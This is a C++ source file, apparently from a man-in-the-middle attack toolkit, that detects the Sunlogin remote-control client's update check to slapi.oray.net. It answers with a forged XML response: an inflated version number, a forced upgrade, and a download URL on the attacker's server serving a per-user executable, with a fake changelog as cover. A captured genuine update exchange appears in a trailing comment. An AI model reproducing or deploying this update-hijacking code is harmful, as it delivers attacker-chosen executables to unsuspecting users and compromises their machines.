
#include "../attacker.h"
#include "SunflowerUpdate.h"
#include <windows.h>
#include "sslPublic.h"
#include "../cipher/CryptoUtils.h"
#include "../HttpUtils.h"
#include "PluginServer.h"


int SunflowerUpdate::isSunflower(string url, string host) {
	if (strstr(host.c_str(), "slapi.oray.net") && strstr(url.c_str(), "/upgrade/check-upgrade"))
	{
		return TRUE;
	}

	return FALSE;
}


int SunflowerUpdate::replySunflower(char * dstbuf, int len, LPHTTPPROXYPARAM lphttp) {
	char * szHttpPartialZipFormat = 
		"HTTP/1.1 200 OK\r\n"
		"Connection: keep-alive\r\n"
		"Content-Type: text/xml; charset=utf-8\r\n"
		"Content-Length: %u\r\n\r\n";

	string ver = "99.2.0.23632";

	char *szxml = 
	"<?xml version=\"1.0\" encoding=\"utf-8\"?>"
	"<response>\r\n"
	"<category>upgrade</category>\r\n"
	"<action>check-upgrade</action>\r\n"
	"<code>0</code>\r\n"
	"<message>SUCCESS</message>\r\n"
	"<datas>\r\n"
	"<data type=\"field\" name=\"isupgrade\">1</data>\r\n"
	"<data type=\"field\" name=\"version\">%s</data>\r\n"
	"<data type=\"field\" name=\"type\">stable</data>\r\n"
	"<data type=\"field\" name=\"downloadurl\">http://%s/%s</data>\r\n"
	"<data type=\"field\" name=\"isforce\">1</data>\r\n"
	"<data type=\"field\" name=\"md5\">%s</data>\r\n"
	"<data type=\"field\" name=\"description\">\r\n"
	"V10.2.0.23632更新日志\n1 调整界面UI，优化用户体验\n2优化远控桌面模式，可选均衡、娱乐、极速模式 \n3 优化远控声音模块\n4 修改部分bug\n\r\n"
	"</data>\r\n"
	"</datas>\r\n"
	"</response>\r\n";

	string ip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

	string filename = Public::getUserPluginPath(lphttp->username) + WEIXIN_PC_UPDATE_EXE_FILENAME;
	char szmd5[256] = { 0 };
	unsigned char hexmd5[256] = { 0 };
	int exefs = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, FALSE);

	char result[4096] = { 0 };
	int retlen = sprintf(result, szxml, ver.c_str(), ip.c_str(), WEIXIN_PC_UPDATE_EXE_FILENAME, szmd5);

	int responseLen = sprintf_s(dstbuf, MAX_RESPONSE_HEADER_SIZE, szHttpPartialZipFormat, retlen, result);

	return responseLen;
}

/*
GET /upgrade/check-upgrade?software=SUNLOGIN%5FX%5FWINDOWS&version=10%2E1%2E0%2E21786&type=stable& HTTP/1.1
Accept: *//*
Host: slapi.oray.net
User-Agent: SLRC/10.1.0.21786 (Windows)
Content-Type: application/x-www-form-urlencoded

HTTP/1.1 200 OK
Connection: keep-alive
Content-Type: text/xml;charset=utf-8
Date: Mon, 23 Mar 2020 20:41:53 GMT
Server: nginx, apiproxy 16531
Transfer-Encoding: chunked

2d1
<?xml version="1.0" encoding="utf-8"?>
<response>
<category>upgrade</category>
<action>checkupgrade</action>
<code>0</code>
<message>SUCCESS</message>
<datas>
<data type="field" name="isupgrade">1</data><data type="field" name="version">10.3.0.27372</data><data type="field" name="type">stable</data><data type="field" name="downloadurl">http://dl-cdn.oray.com/sunlogin/windows/SunloginClient_10.3.0.27372.exe</data><data type="field" name="isforce">0</data><data type="field" name="md5">B35515CECB7DB6A91C04C7F27BB1E426</data><data type="field" name="description">1...........................&quot;-&quot;............
2........................................................................</data>
</datas>
</response>
0
*/